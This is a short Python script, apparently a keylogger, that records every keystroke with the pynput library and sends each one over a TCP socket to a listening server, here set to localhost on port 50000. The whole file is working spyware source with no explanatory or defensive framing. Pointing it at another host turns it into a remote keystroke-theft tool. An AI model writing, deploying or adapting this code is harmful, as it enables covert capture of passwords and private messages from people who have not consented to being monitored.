from pynput import keyboard
from pynput.keyboard import Key
from socket import *
import time


def key_handler(key):
    msg=""
    if key == Key.enter:
        msg='\n'
    elif key==Key.space:
        msg=' '
    elif key==Key.tab:
        msg='\t'
    else:
        msg=str(key).replace("'",'')
    return msg



IP="localhost"
PORT=50000
s=socket(AF_INET, SOCK_STREAM)



# create function used by handler to monitoring the keyboard interaction

def on_press(key):
    msg=key_handler(key)
    s.send(msg.encode())
    


keyboard_listener=keyboard.Listener(
    on_press=on_press 
)

    
try:
    s.connect((IP,PORT))
    keyboard_listener.start()
    while True:
        time.sleep(0.1)

except:
    print("Connection lost")
    

s.close()





